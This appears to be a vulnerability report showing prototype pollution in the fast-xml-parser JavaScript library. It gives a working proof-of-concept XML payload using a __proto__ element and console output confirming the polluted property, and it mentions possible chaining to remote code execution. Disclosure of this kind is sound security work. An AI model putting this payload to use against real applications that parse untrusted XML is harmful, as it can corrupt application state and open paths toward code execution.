Taking an example code from the github repo to demonstrate the bug:


```js
const { XMLParser, XMLBuilder, XMLValidator} = require("fast-xml-parser");


let XMLdata = "<__proto__><polluted>hacked</polluted></__proto__>"

const parser = new XMLParser();
let jObj = parser.parse(XMLdata);


console.log(jObj.polluted) // should return hacked
```

![Code_G3UvvJcSv5](https://user-images.githubusercontent.com/31372554/218308540-86792929-3631-4580-8373-4651487418b5.png)

In the above screenshot you can see the `jObj` was polluted with a new property.

```js
jObj
>{}
jObj.__proto__
>{polluted: 'hacked'}
jObj.__proto__.polluted
>'hacked'
```

More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/

As it is common for developers to pass user controllable input to `XMLParser` , this can to do unexpected results. By chaining it with some prototype pollution gadget it might even can lead to RCE in some cases https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
